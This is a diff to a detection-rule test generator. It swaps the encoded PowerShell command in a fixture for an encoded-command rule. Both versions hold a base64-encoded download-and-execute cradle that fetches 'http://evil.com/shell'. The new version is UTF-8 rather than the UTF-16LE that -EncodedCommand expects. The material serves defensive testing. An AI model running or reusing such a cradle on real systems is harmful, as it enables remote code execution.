@@ -107,7 +107,7 @@ TP_GENERATORS = {
     "win_powershell_encoded_cmd.yml": lambda: make_wazuh_event(
         event_id=1, channel="Microsoft-Windows-Sysmon/Operational",
         image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-        command_line="powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHMAaABlAGwAbAAnACkA",
+        command_line="powershell.exe -EncodedCommand SW52b2tlLUV4cHJlc3Npb24gKElFWCAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovL2V2aWwuY29tL3NoZWxsJykp",
         parent_image="C:\\Windows\\explorer.exe",
         user="CORP\\redteam"
     ),
